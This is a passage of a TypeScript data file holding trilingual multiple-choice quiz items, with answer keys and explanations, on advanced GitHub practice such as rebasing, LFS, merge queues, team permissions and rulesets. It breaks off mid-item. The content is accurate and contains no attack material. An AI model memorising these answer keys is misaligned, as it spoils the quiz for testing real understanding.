/**
 * GitHub, Avancé: rebasing and force-pushing safely, LFS and signed
 * commits, sub-issues and Projects automation, merge queues and stacked
 * pull requests, base permissions and review culture, rulesets, reusable
 * workflows and concurrency, OIDC and pinned actions, CodeQL, secret
 * scanning and dependency review.
 */
import type { LinuxQuestion as GithubQuestion } from "../linux/types";

const reposAdvanced: GithubQuestion[] = [
  {
    id: "gh-repos-21",
    q: ["After rebasing your feature branch, a plain push is refused. Which push is the careful one?", "Après avoir rebasé ta branche, un push normal est refusé. Quel push est le prudent ?", "Tras hacer rebase de tu rama, un push normal se rechaza. ¿Qué push es el prudente?"],
    a: ["`git push --force-with-lease`", "`git push --force-with-lease`", "`git push --force-with-lease`"],
    w: [["`git push --force`", "`git push --force`", "`git push --force`"], ["`git push --no-verify`", "`git push --no-verify`", "`git push --no-verify`"], ["`git push --all`", "`git push --all`", "`git push --all`"]],
    e: [
      "A rebase rewrites the branch's commits, so the remote must be overwritten. `--force-with-lease` does it only if the remote branch is still where you last saw it; if a colleague pushed meanwhile, it refuses instead of erasing their commits. Never rewrite a shared branch.",
      "Un rebase réécrit les commits de la branche, donc il faut écraser la distante. `--force-with-lease` ne le fait que si la branche distante est encore où tu l'as vue en dernier ; si un collègue a poussé entre-temps, il refuse au lieu d'effacer ses commits. Ne réécris jamais une branche partagée.",
      "Un rebase reescribe los commits de la rama, así que hay que sobrescribir la remota. `--force-with-lease` solo lo hace si la rama remota sigue donde la viste por última vez; si un compañero subió entretanto, se niega en vez de borrar sus commits. Nunca reescribas una rama compartida.",
    ],
  },
  {
    id: "gh-repos-22",
    q: ["Why use Git LFS for large binary files?", "Pourquoi utiliser Git LFS pour de gros fichiers binaires ?", "¿Por qué usar Git LFS para archivos binarios grandes?"],
    a: ["The repository keeps small pointers; the files themselves live in separate storage and are fetched when checked out", "Le dépôt garde de petits pointeurs ; les fichiers eux-mêmes vivent dans un stockage à part et sont récupérés au checkout", "El repositorio guarda punteros pequeños; los archivos en sí viven en un almacenamiento aparte y se descargan al hacer checkout"],
    w: [["LFS compresses the files so that Git stores them better", "LFS compresse les fichiers pour que Git les stocke mieux", "LFS comprime los archivos para que Git los guarde mejor"], ["LFS encrypts the files", "LFS chiffre les fichiers", "LFS cifra los archivos"], ["LFS turns binaries into text diffs", "LFS change les binaires en diffs texte", "LFS convierte los binarios en diffs de texto"]],
    e: [
      "Every version of every file stays in Git's history forever, so a 200 MB asset changed ten times weighs on every clone. `git lfs track '*.psd'` stores such files outside, with quotas per account. GitHub rejects files over 100 MB in plain Git.",
      "Chaque version de chaque fichier reste pour toujours dans l'historique Git, donc un fichier de 200 Mo modifié dix fois pèse sur chaque clone. `git lfs track '*.psd'` stocke ces fichiers à part, avec des quotas par compte. GitHub refuse en Git simple les fichiers de plus de 100 Mo.",
      "Cada versión de cada archivo se queda para siempre en el historial de Git, así que un recurso de 200 MB cambiado diez veces pesa en cada clon. `git lfs track '*.psd'` guarda esos archivos aparte, con cuotas por cuenta. GitHub rechaza en Git normal los archivos de más de 100 MB.",
    ],
  },
  {
    id: "gh-repos-23",
    q: ["What does the Verified badge on a commit mean?", "Que signifie le badge Verified sur un commit ?", "¿Qué significa la insignia Verified en un commit?"],
    a: ["The commit was signed with a GPG, SSH or S/MIME key that GitHub links to the author's account", "Le commit a été signé avec une clé GPG, SSH ou S/MIME que GitHub relie au compte de l'auteur", "El commit se firmó con una clave GPG, SSH o S/MIME que GitHub asocia a la cuenta del autor"],
    w: [["The commit passed all the tests", "Le commit a passé tous les tests", "El commit pasó todas las pruebas"], ["A maintainer reviewed the commit", "Un mainteneur a relu le commit", "Un mantenedor revisó el commit"], ["The author's e-mail address was confirmed", "L'adresse e-mail de l'auteur a été confirmée", "Se confirmó la dirección de correo del autor"]],
    e: [
      "Anyone can set any name and e-mail in a commit, so the author field proves nothing. A signature proves the key holder made it. Commits made in GitHub's web interface are signed by GitHub. Branch protection can require signed commits.",
      "N'importe qui peut mettre n'importe quel nom et e-mail dans un commit, donc le champ auteur ne prouve rien. Une signature prouve que le détenteur de la clé l'a fait. Les commits faits dans l'interface web de GitHub sont signés par GitHub. La protection de branche peut exiger des commits signés.",
      "Cualquiera puede poner cualquier nombre y correo en un commit, así que el campo autor no prueba nada. Una firma prueba que lo hizo quien tiene la clave. Los commits hechos en la interfaz web de GitHub los firma GitHub. La protección de rama puede exigir commits firmados.",
    ],
  },
  {
    id: "gh-repos-24",
    q: ["A repository has a huge history and CI only needs the latest code. Which checkout is fastest?", "Un dépôt a un historique énorme et la CI n'a besoin que du dernier code. Quel checkout est le plus rapide ?", "Un repositorio tiene un historial enorme y la CI solo necesita el código más reciente. ¿Qué checkout es el más rápido?"],
    a: ["A shallow clone of depth 1, which `actions/checkout` does by default", "Un clone superficiel de profondeur 1, ce que `actions/checkout` fait par défaut", "Un clon superficial de profundidad 1, lo que `actions/checkout` hace por defecto"],
    w: [["A full clone with `fetch-depth: 0`", "Un clone complet avec `fetch-depth: 0`", "Un clon completo con `fetch-depth: 0`"], ["Downloading every release asset", "Télécharger chaque fichier des releases", "Descargar todos los archivos de las releases"], ["A mirror clone", "Un clone miroir", "Un clon espejo"]],
    e: [
      "`actions/checkout` fetches only the commit being built unless told otherwise. Tools that need history (version from tags, changelog, `git describe`) need `fetch-depth: 0`. Partial clones (`--filter=blob:none`) are another middle ground: full history, files fetched on demand.",
      "`actions/checkout` ne récupère que le commit construit sauf indication contraire. Les outils qui ont besoin de l'historique (version tirée des tags, changelog, `git describe`) demandent `fetch-depth: 0`. Les clones partiels (`--filter=blob:none`) sont un autre compromis : tout l'historique, les fichiers récupérés à la demande.",
      "`actions/checkout` solo descarga el commit que se construye salvo que se indique otra cosa. Las herramientas que necesitan historial (versión sacada de los tags, changelog, `git describe`) requieren `fetch-depth: 0`. Los clones parciales (`--filter=blob:none`) son otro término medio: todo el historial, con los archivos descargados bajo demanda.",
    ],
  },
];

const issuesAdvanced: GithubQuestion[] = [
  {
    id: "gh-issues-21",
    q: ["A feature needs six pieces of work across two repositories. How do sub-issues help?", "Une fonctionnalité demande six tâches sur deux dépôts. Comment les sous-issues aident-elles ?", "Una función requiere seis tareas en dos repositorios. ¿Cómo ayudan las sub-issues?"],
    a: ["The feature issue becomes a parent with child issues, showing their progress, even across repositories", "L'issue de la fonctionnalité devient un parent avec des issues enfants, dont elle montre l'avancement, même entre dépôts", "La issue de la función pasa a ser padre de issues hijas y muestra su avance, incluso entre repositorios"],
    w: [["They copy the issue into each repository", "Elles copient l'issue dans chaque dépôt", "Copian la issue en cada repositorio"], ["They merge the six issues into one", "Elles fusionnent les six issues en une", "Fusionan las seis issues en una"], ["They create one branch per task automatically", "Elles créent automatiquement une branche par tâche", "Crean automáticamente una rama por tarea"]],
    e: [
      "Sub-issues form a hierarchy several levels deep. The parent shows how many children are closed, and Projects can group and filter by parent. Issue types (bug, feature, task) set by the organization complement labels for this kind of planning.",
      "Les sous-issues forment une hiérarchie sur plusieurs niveaux. Le parent montre combien d'enfants sont fermés, et les Projects peuvent regrouper et filtrer par parent. Les types d'issue (bug, feature, task) définis par l'organisation complètent les labels pour ce genre de planification.",
      "Las sub-issues forman una jerarquía de varios niveles. El padre muestra cuántas hijas están cerradas, y los Projects pueden agrupar y filtrar por padre. Los tipos de issue (bug, feature, task) definidos por la organización completan a las etiquetas para este tipo de planificación.",
    ],
  },
  {
    id: "gh-issues-22",
    q: ["A team wants every new issue of a repository added to its Project with Status Todo. What is the simplest way?", "Une équipe veut que chaque nouvelle issue d'un dépôt soit ajoutée à son Project avec Status Todo. Quelle est la manière la plus simple ?", "Un equipo quiere que cada issue nueva de un repositorio se añada a su Project con Status Todo. ¿Cuál es la forma más sencilla?"],
    a: ["The Project's built-in workflows: auto-add items matching a filter, and set Status when an item is added", "Les workflows intégrés du Project : ajout automatique des éléments selon un filtre, et réglage de Status à l'ajout", "Los workflows integrados del Project: añadir automáticamente los elementos según un filtro y fijar Status al añadirlos"],
    w: [["A cron job that copies issues every night", "Une tâche cron qui copie les issues chaque nuit", "Una tarea cron que copia las issues cada noche"], ["Asking everyone to add issues by hand", "Demander à chacun d'ajouter les issues à la main", "Pedir a todos que añadan las issues a mano"], ["A label named `todo`", "Un label nommé `todo`", "Una etiqueta llamada `todo`"]],
    e: [
      "Projects ship workflows such as Auto-add to project, Item added, Item closed and Pull request merged, configured in the Project without code. For anything more specific, a GitHub Actions workflow can call the GraphQL API with a token that has project access.",
      "Les Projects fournissent des workflows comme Auto-add to project, Item added, Item closed et Pull request merged, réglés dans le Project sans code. Pour quelque chose de plus précis, un workflow GitHub Actions peut appeler l'API GraphQL avec un jeton ayant accès au projet.",
      "Los Projects traen workflows como Auto-add to project, Item added, Item closed y Pull request merged, configurados en el Project sin código. Para algo más concreto, un workflow de GitHub Actions puede llamar a la API GraphQL con un token con acceso al proyecto.",
    ],
  },
  {
    id: "gh-issues-23",
    q: ["Which search finds open bugs that nobody is working on in a repository?", "Quelle recherche trouve les bugs ouverts auxquels personne ne travaille dans un dépôt ?", "¿Qué búsqueda encuentra los bugs abiertos en los que nadie trabaja en un repositorio?"],
    a: ["`is:issue is:open label:bug no:assignee`", "`is:issue is:open label:bug no:assignee`", "`is:issue is:open label:bug no:assignee`"],
    w: [["`issue open bug unassigned`", "`issue open bug unassigned`", "`issue open bug unassigned`"], ["`type:bug status:free`", "`type:bug status:free`", "`type:bug status:free`"], ["`is:open assignee:none bugs`", "`is:open assignee:none bugs`", "`is:open assignee:none bugs`"]],
    e: [
      "Qualifiers combine with AND: `is:` (issue, pr, open, closed, merged), `label:`, `no:` (assignee, label, milestone), `author:`, `assignee:`, `updated:<2026-01-01`. Saved as a Project view or bookmarked, such a query becomes a triage list.",
      "Les qualificatifs se combinent par ET : `is:` (issue, pr, open, closed, merged), `label:`, `no:` (assignee, label, milestone), `author:`, `assignee:`, `updated:<2026-01-01`. Enregistrée comme vue de Project ou en favori, une telle requête devient une liste de tri.",
      "Los calificadores se combinan con Y: `is:` (issue, pr, open, closed, merged), `label:`, `no:` (assignee, label, milestone), `author:`, `assignee:`, `updated:<2026-01-01`. Guardada como vista de un Project o en favoritos, una consulta así se convierte en una lista de triaje.",
    ],
  },
  {
    id: "gh-issues-24",
    q: ["A thread on a closed issue turns into a heated argument. What can a maintainer do?", "Un fil sur une issue fermée tourne à la dispute. Que peut faire un mainteneur ?", "Un hilo en una issue cerrada se convierte en una discusión acalorada. ¿Qué puede hacer un mantenedor?"],
    a: ["Lock the conversation, hide off-topic or abusive comments, and point to the code of conduct", "Verrouiller la conversation, masquer les commentaires hors sujet ou abusifs, et renvoyer au code de conduite", "Bloquear la conversación, ocultar los comentarios fuera de tema o abusivos y remitir al código de conducta"],
    w: [["Delete the repository", "Supprimer le dépôt", "Borrar el repositorio"], ["Reopen the issue to calm people down", "Rouvrir l'issue pour calmer les gens", "Reabrir la issue para calmar los ánimos"], ["Nothing: comments can only be removed by GitHub", "Rien : seul GitHub peut retirer des commentaires", "Nada: solo GitHub puede quitar comentarios"]],
    e: [
      "Locking limits comments to collaborators; hiding marks comments as off-topic, outdated, spam or abuse. Organizations can block users and set temporary interaction limits on public repositories. A `CODE_OF_CONDUCT.md` gives the rules to point to.",
      "Verrouiller limite les commentaires aux collaborateurs ; masquer marque des commentaires comme hors sujet, dépassés, spam ou abus. Les organisations peuvent bloquer des utilisateurs et fixer des limites d'interaction temporaires sur les dépôts publics. Un `CODE_OF_CONDUCT.md` donne les règles auxquelles renvoyer.",
      "Bloquear limita los comentarios a los colaboradores; ocultar marca comentarios como fuera de tema, obsoletos, spam o abuso. Las organizaciones pueden bloquear usuarios y fijar límites temporales de interacción en repositorios públicos. Un `CODE_OF_CONDUCT.md` da las reglas a las que remitir.",
    ],
  },
];

const pullsAdvanced: GithubQuestion[] = [
  {
    id: "gh-pulls-21",
    q: ["What does a merge queue do?", "Que fait une merge queue ?", "¿Qué hace una merge queue?"],
    a: ["It tests each pull request combined with those ahead of it on the latest base, and merges only what passes", "Elle teste chaque pull request combinée avec celles qui la précèdent sur la dernière base, et ne fusionne que ce qui passe", "Prueba cada pull request combinada con las que tiene delante sobre la base más reciente y solo fusiona lo que pasa"],
    w: [["It merges pull requests in alphabetical order", "Elle fusionne les pull requests par ordre alphabétique", "Fusiona las pull requests por orden alfabético"], ["It delays merges until the night", "Elle reporte les fusions à la nuit", "Retrasa las fusiones hasta la noche"], ["It merges without running checks, to save time", "Elle fusionne sans lancer de vérifications, pour gagner du temps", "Fusiona sin lanzar comprobaciones, para ahorrar tiempo"]],
    e: [
      "When a pull request is ready, it joins the queue; GitHub builds a temporary branch with the base plus the pull requests ahead of it, runs the required checks (triggered by `merge_group`), and merges if they pass. It removes the race between two green pull requests that break together.",
      "Une pull request prête rejoint la file ; GitHub construit une branche temporaire avec la base plus les pull requests qui la précèdent, lance les vérifications exigées (déclenchées par `merge_group`), et fusionne si elles passent. Cela supprime la course entre deux pull requests vertes qui cassent ensemble.",
      "Una pull request lista entra en la cola; GitHub construye una rama temporal con la base más las pull requests que tiene delante, lanza las comprobaciones exigidas (disparadas por `merge_group`) y fusiona si pasan. Elimina la carrera entre dos pull requests en verde que rompen juntas.",
    ],
  },
  {
    id: "gh-pulls-22",
    q: ["With a merge queue required, a workflow runs only `on: pull_request`. What goes wrong?", "Avec une merge queue exigée, un workflow ne tourne que sur `on: pull_request`. Qu'est-ce qui coince ?", "Con una merge queue exigida, un workflow solo corre en `on: pull_request`. ¿Qué falla?"],
    a: ["The required checks never report on the queue's branch, so pull requests wait in the queue forever", "Les vérifications exigées ne rapportent jamais sur la branche de la file, donc les pull requests y attendent pour toujours", "Las comprobaciones exigidas nunca informan en la rama de la cola, así que las pull requests esperan en ella para siempre"],
    w: [["Nothing: the queue reuses the pull request's results", "Rien : la file réutilise les résultats de la pull request", "Nada: la cola reutiliza los resultados de la pull request"], ["The queue merges without checks", "La file fusionne sans vérifications", "La cola fusiona sin comprobaciones"], ["The workflow runs twice on every push", "Le workflow tourne deux fois à chaque push", "El workflow corre dos veces en cada push"]],
    e: [
      "The queue tests a new commit, the combination, so the required workflows must also listen to `merge_group`. Adding `merge_group:` beside `pull_request:` in `on:` fixes it; the same job names then report on both.",
      "La file teste un nouveau commit, la combinaison, donc les workflows exigés doivent aussi écouter `merge_group`. Ajouter `merge_group:` à côté de `pull_request:` dans `on:` règle le problème ; les mêmes noms de jobs rapportent alors sur les deux.",
      "La cola prueba un commit nuevo, la combinación, así que los workflows exigidos también deben escuchar `merge_group`. Añadir `merge_group:` junto a `pull_request:` en `on:` lo arregla; los mismos nombres de job informan entonces en ambos.",
    ],
  },
  {
    id: "gh-pulls-23",
    q: ["What does auto-merge do on a pull request?", "Que fait l'auto-merge sur une pull request ?", "¿Qué hace el auto-merge en una pull request?"],
    a: ["It merges the pull request as soon as every requirement is met, such as approvals and checks", "Il fusionne la pull request dès que toutes les exigences sont remplies, comme les approbations et les vérifications", "Fusiona la pull request en cuanto se cumplen todos los requisitos, como aprobaciones y comprobaciones"],
    w: [["It merges immediately, skipping the requirements", "Il fusionne tout de suite, en sautant les exigences", "Fusiona enseguida, saltándose los requisitos"], ["It approves the pull request on behalf of the reviewers", "Il approuve la pull request à la place des relecteurs", "Aprueba la pull request en nombre de los revisores"], ["It rebases the pull request every hour", "Il rebase la pull request toutes les heures", "Hace rebase de la pull request cada hora"]],
    e: [
      "Auto-merge needs branch protection rules to wait for; with nothing pending, the pull request just merges. It suits Dependabot patch updates: a workflow enables auto-merge, and the merge happens once the required checks pass. A new push from someone without write access disables it.",
      "L'auto-merge a besoin de règles de protection à attendre ; sans rien en attente, la pull request fusionne simplement. Il convient aux mises à jour correctives de Dependabot : un workflow active l'auto-merge, et la fusion a lieu une fois les vérifications exigées passées. Un nouveau push de quelqu'un sans accès en écriture le désactive.",
      "El auto-merge necesita reglas de protección que esperar; sin nada pendiente, la pull request simplemente se fusiona. Va bien con las actualizaciones de parche de Dependabot: un workflow activa el auto-merge y la fusión ocurre cuando pasan las comprobaciones exigidas. Un push nuevo de alguien sin acceso de escritura lo desactiva.",
    ],
  },
  {
    id: "gh-pulls-24",
    q: ["What are stacked pull requests?", "Que sont des pull requests empilées (stacked) ?", "¿Qué son las pull requests apiladas (stacked)?"],
    a: ["A chain where each pull request is based on the branch of the one before, so a large change is reviewed in small steps", "Une chaîne où chaque pull request a pour base la branche de la précédente, pour relire un gros changement par petites étapes", "Una cadena en la que cada pull request tiene como base la rama de la anterior, para revisar un cambio grande en pasos pequeños"],
    w: [["Several pull requests merged at the same time with one click", "Plusieurs pull requests fusionnées en même temps d'un clic", "Varias pull requests fusionadas a la vez con un clic"], ["Pull requests that only maintainers can see", "Des pull requests que seuls les mainteneurs voient", "Pull requests que solo ven los mantenedores"], ["Duplicate pull requests for the same issue", "Des pull requests en double pour la même issue", "Pull requests duplicadas para la misma issue"]],
    e: [
      "Part 2's base is part 1's branch, part 3's base is part 2's, and so on; each diff shows one step. When part 1 merges, GitHub retargets part 2 onto `main`. Changes low in the stack must be propagated upward by rebasing, which tools can automate.",
      "La base de la partie 2 est la branche de la partie 1, celle de la partie 3 la branche de la partie 2, et ainsi de suite ; chaque diff montre une étape. Quand la partie 1 fusionne, GitHub recible la partie 2 sur `main`. Les changements du bas de la pile doivent être propagés vers le haut par rebase, ce que des outils automatisent.",
      "La base de la parte 2 es la rama de la parte 1, la de la parte 3 la de la parte 2, y así sucesivamente; cada diff muestra un paso. Cuando la parte 1 se fusiona, GitHub cambia la base de la parte 2 a `main`. Los cambios de abajo de la pila hay que propagarlos hacia arriba con rebase, que hay herramientas que automatizan.",
    ],
  },
];

const teamsAdvanced: GithubQuestion[] = [
  {
    id: "gh-teams-21",
    q: ["An organization's base permission is Read. What does that mean for its members?", "La permission de base d'une organisation est Read. Qu'est-ce que cela signifie pour ses membres ?", "El permiso base de una organización es Read. ¿Qué significa para sus miembros?"],
    a: ["Every member can read every repository of the organization; more must come from teams or direct grants", "Chaque membre peut lire tous les dépôts de l'organisation ; davantage doit venir des équipes ou d'accès directs", "Cada miembro puede leer todos los repositorios de la organización; más permisos deben venir de equipos o accesos directos"],
    w: [["Members can only read public repositories", "Les membres ne peuvent lire que les dépôts publics", "Los miembros solo pueden leer los repositorios públicos"], ["Members cannot create teams", "Les membres ne peuvent pas créer d'équipes", "Los miembros no pueden crear equipos"], ["Outside collaborators get Read on every repository", "Les collaborateurs externes ont Read sur tous les dépôts", "Los colaboradores externos tienen Read en todos los repositorios"]],
    e: [
      "The base permission (No permission, Read, Write, Admin) applies to all members on all repositories; a person's effective access is the highest of base, team and direct grants. Outside collaborators are not members and see only the repositories they were added to.",
      "La permission de base (No permission, Read, Write, Admin) s'applique à tous les membres sur tous les dépôts ; l'accès effectif d'une personne est le plus élevé entre base, équipes et accès directs. Les collaborateurs externes ne sont pas membres et ne voient que les dépôts où on les a ajoutés.",
      "El permiso base (No permission, Read, Write, Admin) se aplica a todos los miembros en todos los repositorios; el acceso efectivo de una persona es el mayor entre base, equipos y accesos directos. Los colaboradores externos no son miembros y solo ven los repositorios a los que se les añadió.",
    ],
  },
  {
    id: "gh-teams-22",
    q: ["Team `@acme/frontend` is a child of `@acme/engineering`. What do its members inherit?", "L'équipe `@acme/frontend` est enfant de `@acme/engineering`. Qu'héritent ses membres ?", "El equipo `@acme/frontend` es hijo de `@acme/engineering`. ¿Qué heredan sus miembros?"],
    a: ["The parent team's repository access and its mentions", "Les accès aux dépôts de l'équipe parente et ses mentions", "Los accesos a repositorios del equipo padre y sus menciones"],
    w: [["Nothing: nesting is only for display", "Rien : l'imbrication n'est qu'affichage", "Nada: el anidamiento es solo visual"], ["Admin rights over the parent team", "Les droits d'administration sur l'équipe parente", "Derechos de administración sobre el equipo padre"], ["Membership of every sibling team", "L'appartenance à toutes les équipes sœurs", "La pertenencia a todos los equipos hermanos"]],
    e: [
      "Child teams inherit the parent's access, and mentioning the parent notifies the children's members too. Grant broad read access at the parent and narrower write access on the children. Inheritance goes downward only.",
      "Les équipes enfants héritent des accès du parent, et mentionner le parent notifie aussi les membres des enfants. Accorde un large accès en lecture au parent et des accès en écriture plus étroits aux enfants. L'héritage ne descend que vers le bas.",
      "Los equipos hijos heredan los accesos del padre, y mencionar al padre notifica también a los miembros de los hijos. Da acceso amplio de lectura al padre y accesos de escritura más estrechos a los hijos. La herencia solo va hacia abajo.",
    ],
  },
  {
    id: "gh-teams-23",
    q: ["Pull requests wait three days for review. Which team practice helps most?", "Les pull requests attendent trois jours une revue. Quelle pratique d'équipe aide le plus ?", "Las pull requests esperan tres días a ser revisadas. ¿Qué práctica de equipo ayuda más?"],
    a: ["Small pull requests and an agreed review time, with reviewing treated as part of the work rather than an interruption", "Des pull requests petites et un délai de revue convenu, la revue étant considérée comme du travail et non une interruption", "Pull requests pequeñas y un plazo de revisión acordado, con la revisión tratada como parte del trabajo y no como una interrupción"],
    w: [["Letting authors merge without review after a day", "Laisser les auteurs fusionner sans revue après un jour", "Dejar que los autores fusionen sin revisión pasado un día"], ["Assigning every pull request to the most senior person", "Assigner chaque pull request à la personne la plus expérimentée", "Asignar cada pull request a la persona más veterana"], ["Reviewing only on Fridays", "Ne relire que le vendredi", "Revisar solo los viernes"]],
    e: [
      "Waiting pull requests grow conflicts and context switches. Small changes are quick to review; an expectation such as a first response within a working day, review requests to a team rather than one person, and CODEOWNERS spread the load. Bypassing review removes the safety it gives.",
      "Les pull requests en attente accumulent conflits et changements de contexte. Les petits changements se relisent vite ; une attente comme une première réponse dans la journée de travail, des demandes de revue adressées à une équipe plutôt qu'à une personne, et CODEOWNERS répartissent la charge. Contourner la revue supprime la sécurité qu'elle apporte.",
      "Las pull requests en espera acumulan conflictos y cambios de contexto. Los cambios pequeños se revisan rápido; una expectativa como una primera respuesta en el día laborable, peticiones de revisión a un equipo en vez de a una persona y CODEOWNERS reparten la carga. Saltarse la revisión elimina la seguridad que aporta.",
    ],
  },
  {
    id: "gh-teams-24",
    q: ["What is inner source?", "Qu'est-ce que l'inner source ?", "¿Qué es el inner source?"],
    a: ["Applying open-source practices inside a company: any team can read and contribute to another team's repositories through pull requests", "Appliquer les pratiques open source dans une entreprise : toute équipe peut lire les dépôts d'une autre et y contribuer par pull requests", "Aplicar las prácticas del código abierto dentro de una empresa: cualquier equipo puede leer los repositorios de otro y contribuir con pull requests"],
    w: [["Publishing all internal code under an open-source licence", "Publier tout le code interne sous licence open source", "Publicar todo el código interno con licencia de código abierto"], ["Keeping each team's code invisible to others", "Rendre le code de chaque équipe invisible aux autres", "Hacer invisible para los demás el código de cada equipo"], ["Outsourcing development to contractors", "Sous-traiter le développement", "Subcontratar el desarrollo"]],
    e: [
      "With internal visibility (in enterprises) or a Read base permission, people find and reuse code instead of duplicating it, and fix what blocks them by proposing a pull request to the owning team. Good READMEs, `CONTRIBUTING.md` and CODEOWNERS make it work.",
      "Avec la visibilité interne (dans les entreprises) ou une permission de base Read, on trouve et réutilise le code au lieu de le dupliquer, et on corrige ce qui bloque en proposant une pull request à l'équipe propriétaire. De bons README, un `CONTRIBUTING.md` et CODEOWNERS le rendent possible.",
      "Con visibilidad interna (en las empresas) o un permiso base Read, se encuentra y reutiliza el código en vez de duplicarlo, y se arregla lo que bloquea proponiendo una pull request al equipo dueño. Buenos README, un `CONTRIBUTING.md` y CODEOWNERS lo hacen posible.",
    ],
  },
];

const protectionAdvanced: GithubQuestion[] = [
  {
    id: "gh-protection-21",
    q: ["What do rulesets offer over classic branch protection rules?", "Qu'offrent les rulesets par rapport aux règles classiques de protection de branche ?", "¿Qué ofrecen los rulesets frente a las reglas clásicas de protección de rama?"],
    a: ["Several can apply at once, they can target tags and many repositories, have bypass lists and an evaluate mode, and are visible to everyone with read access", "Plusieurs peuvent s'appliquer à la fois, ils peuvent viser des tags et de nombreux dépôts, ont des listes de contournement et un mode évaluation, et sont visibles par tous ceux qui ont l'accès en lecture", "Varios pueden aplicarse a la vez, pueden apuntar a tags y a muchos repositorios, tienen listas de omisión y un modo evaluación, y los ve todo el que tiene acceso de lectura"],
    w: [["They are the same rules under a new name", "Ce sont les mêmes règles sous un nouveau nom", "Son las mismas reglas con otro nombre"], ["They only apply to private repositories", "Ils ne s'appliquent qu'aux dépôts privés", "Solo se aplican a repositorios privados"], ["They replace code review with automatic checks", "Ils remplacent la revue de code par des vérifications automatiques", "Sustituyen la revisión de código por comprobaciones automáticas"]],
    e: [
      "A classic rule protects branches of one repository, and only one rule applies to a branch. Rulesets layer: an organization ruleset for all repositories plus a repository ruleset, with roles, teams or apps allowed to bypass. Evaluate mode reports what would be blocked without enforcing.",
      "Une règle classique protège des branches d'un seul dépôt, et une seule règle s'applique à une branche. Les rulesets se superposent : un ruleset d'organisation pour tous les dépôts plus un ruleset de dépôt, avec des rôles, équipes ou applications autorisés à contourner. Le mode évaluation signale ce qui serait bloqué sans l'imposer.",
      "Una regla clásica protege ramas de un solo repositorio, y solo una regla se aplica a una rama. Los rulesets se superponen: un ruleset de organización para todos los repositorios más uno de repositorio, con roles, equipos o apps autorizados a omitirlos. El modo evaluación informa de lo que se bloquearía sin imponerlo.",
    ],
  },
  {
    id: "gh-protection-22",
    q: ["Why start a new organization-wide ruleset in evaluate mode?", "Pourquoi démarrer un nouveau ruleset d'organisation en mode évaluation ?", "¿Por qué empezar en modo evaluación un ruleset nuevo de toda la organización?"],
    a: ["To see in rule insights which pushes and merges it would block, before it blocks anyone", "Pour voir dans les rule insights quels push et fusions il bloquerait, avant qu'il bloque qui que ce soit", "Para ver en los rule insights qué push y fusiones bloquearía, antes de que bloquee a nadie"],
    w: [["Because rulesets cannot be enforced immediately", "Parce que les rulesets ne peuvent pas être imposés tout de suite", "Porque los rulesets no se pueden imponer de inmediato"], ["To make it apply only to administrators", "Pour qu'il ne s'applique qu'aux administrateurs", "Para que solo se aplique a los administradores"], ["To save Actions minutes", "Pour économiser des minutes d'Actions", "Para ahorrar minutos de Actions"]],
    e: [
      "A rule that suddenly blocks many repositories halts work. Evaluate mode (on Enterprise plans) logs would-be violations; once the list is understood and repositories fixed, the ruleset is switched to Active. The same dry-run idea appears in policy engines and Terraform plans.",
      "Une règle qui bloque soudain de nombreux dépôts arrête le travail. Le mode évaluation (sur les plans Enterprise) journalise les violations qui auraient lieu ; une fois la liste comprise et les dépôts corrigés, le ruleset passe en Active. La même idée d'essai à blanc existe dans les moteurs de politiques et les plans Terraform.",
      "Una regla que de repente bloquea muchos repositorios detiene el trabajo. El modo evaluación (en los planes Enterprise) registra las infracciones que ocurrirían; una vez entendida la lista y corregidos los repositorios, el ruleset pasa a Active. La misma idea de ensayo aparece en los motores de políticas y en los planes de Terraform.",
    ],
  },
  {
    id: "gh-protection-23",
    q: ["A release workflow must push version tags `v*`, but nobody else should create them. How?", "Un workflow de release doit pousser des tags de version `v*`, mais personne d'autre ne doit en créer. Comment ?", "Un workflow de release debe subir tags de versión `v*`, pero nadie más debe crearlos. ¿Cómo?"],
    a: ["A tag ruleset on `v*` restricting creation, with the release GitHub App in its bypass list", "Un ruleset de tags sur `v*` qui restreint la création, avec l'application GitHub de release dans sa liste de contournement", "Un ruleset de tags sobre `v*` que restringe la creación, con la GitHub App de release en su lista de omisión"],
    w: [["A `.gitignore` entry for `v*`", "Une entrée `v*` dans `.gitignore`", "Una entrada `v*` en `.gitignore`"], ["A branch protection rule on `main`", "Une règle de protection de branche sur `main`", "Una regla de protección de rama en `main`"], ["Telling people in `CONTRIBUTING.md`", "Le dire aux gens dans `CONTRIBUTING.md`", "Decírselo a la gente en `CONTRIBUTING.md`"]],
    e: [
      "Rulesets can target tags as well as branches, with rules such as restrict creations, updates and deletions. Tags pushed by deployment pipelines then come only from the trusted identity. Tags pushed with the `GITHUB_TOKEN` do not trigger other workflows, one reason releases often use an app token.",
      "Les rulesets peuvent viser des tags comme des branches, avec des règles comme restreindre créations, mises à jour et suppressions. Les tags dont dépendent les pipelines de déploiement ne viennent alors que de l'identité de confiance. Les tags poussés avec le `GITHUB_TOKEN` ne déclenchent pas d'autres workflows, une raison pour laquelle les releases utilisent souvent un jeton d'application.",
      "Los rulesets pueden apuntar a tags además de ramas, con reglas como restringir creaciones, actualizaciones y borrados. Los tags de los que dependen los pipelines de despliegue solo vienen entonces de la identidad de confianza. Los tags subidos con el `GITHUB_TOKEN` no disparan otros workflows, una razón por la que las releases suelen usar un token de app.",
    ],
  },
  {
    id: "gh-protection-24",
    q: ["Who should be in a ruleset's bypass list?", "Qui doit figurer dans la liste de contournement d'un ruleset ?", "¿Quién debe estar en la lista de omisión de un ruleset?"],
    a: ["As few actors as possible, such as one automation app or a small release team, ideally allowed through pull requests only", "Le moins d'acteurs possible, comme une application d'automatisation ou une petite équipe de release, idéalement autorisés seulement via des pull requests", "Los menos actores posibles, como una app de automatización o un pequeño equipo de release, idealmente autorizados solo mediante pull requests"],
    w: [["Every administrator, so that work never blocks", "Chaque administrateur, pour que le travail ne bloque jamais", "Cada administrador, para que el trabajo nunca se bloquee"], ["All members with write access", "Tous les membres avec l'accès en écriture", "Todos los miembros con acceso de escritura"], ["Nobody: rulesets cannot be bypassed", "Personne : on ne peut pas contourner un ruleset", "Nadie: un ruleset no se puede omitir"]],
    e: [
      "Each bypass is an exception to the guarantees the ruleset gives. Keep it short, prefer apps over people, and choose bypass for pull requests only where possible, so even a bypass leaves a reviewed record. Bypasses appear in rule insights and the audit log.",
      "Chaque contournement est une exception aux garanties du ruleset. Garde la liste courte, préfère les applications aux personnes, et choisis le contournement pour les pull requests seulement quand c'est possible, pour qu'un contournement laisse quand même une trace relue. Les contournements apparaissent dans les rule insights et le journal d'audit.",
